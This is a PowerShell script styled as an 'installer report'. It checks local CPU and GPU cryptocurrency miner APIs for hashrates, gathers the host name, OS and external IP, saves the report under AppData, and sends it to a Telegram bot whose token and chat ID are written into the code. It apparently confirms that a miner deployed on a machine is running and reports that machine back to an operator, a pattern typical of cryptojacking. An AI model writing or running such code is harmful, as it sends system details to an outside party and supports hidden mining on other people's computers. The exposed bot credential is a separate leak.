# ========= CONFIG =========
$TG_TOKEN="8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
$TG_CHAT ="5336452267"
$ATTEMPTS_MAX=3
$TIMEOUT=120
$STEP=5
$REPORT_DIR="$env:APPDATA\installer"
$REPORT_FILE="$REPORT_DIR\report.txt"

# ========= UTF-8 TG =========
function Send-TG($text){
  $json=@{chat_id=$TG_CHAT;text=$text}|ConvertTo-Json
  $bytes=[Text.Encoding]::UTF8.GetBytes($json)
  Invoke-WebRequest "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
    -Method POST -ContentType "application/json; charset=utf-8" -Body $bytes `
    -ErrorAction SilentlyContinue | Out-Null
}

# ========= HELPERS =========
New-Item -ItemType Directory -Force -Path $REPORT_DIR | Out-Null
$HOST=$env:COMPUTERNAME
$OS=(Get-CimInstance Win32_OperatingSystem).Caption
$IP=(Invoke-RestMethod "https://api.ipify.org").Trim()
$START=Get-Date

function Check-Once {
  $cpuHR=0;$gpuHR=0
  try{$cpu=(Invoke-RestMethod "http://127.0.0.1:16000/1/summary");$cpuHR=[int]$cpu.hashrate.total[0]}catch{}
  try{$gpu=(Invoke-RestMethod "http://127.0.0.1:8080/summary");$gpuHR=[int]($gpu.Session.Performance_Summary.Performance*1e6)}catch{}
  return @($cpuHR,$gpuHR)
}

# ========= RETRY LOOP =========
$attempt=1;$elapsedTotal=0;$final=$null
while($attempt -le $ATTEMPTS_MAX){
  $elapsed=0;$cpuHR=0;$gpuHR=0
  while($elapsed -lt $TIMEOUT){
    $r=Check-Once;$cpuHR=$r[0];$gpuHR=$r[1]
    if($cpuHR -gt 0 -or $gpuHR -gt 0){break}
    Start-Sleep $STEP;$elapsed+=$STEP
  }
  if($cpuHR -gt 0 -or $gpuHR -gt 0){
    $final=@($cpuHR,$gpuHR,$attempt,$elapsed);break
  }
  $attempt++
}
if(-not $final){$final=@(0,0,$ATTEMPTS_MAX,$elapsed)}

$cpuHR=$final[0];$gpuHR=$final[1];$ATT=$final[2];$EL=$final[3]
if($cpuHR -gt 0 -and $gpuHR -gt 0){$STATUS="OK"}
elseif($cpuHR -gt 0 -or $gpuHR -gt 0){$STATUS="PARTIAL"}
else{$STATUS="FAILED"}

$REPORT=@"
INSTALLER REPORT
Platform: windows
Status: $STATUS

Host: $HOST
External IP: $IP
OS: $OS
Time: $(Get-Date)

CPU:
  detected: $($cpuHR -gt 0)
  hashrate: $cpuHR H/s

GPU:
  detected: $($gpuHR -gt 0)
  hashrate: $gpuHR H/s

Attempts: $ATT
Elapsed: ${EL}s
"@

$REPORT | Out-File -Encoding UTF8 $REPORT_FILE
Send-TG $REPORT
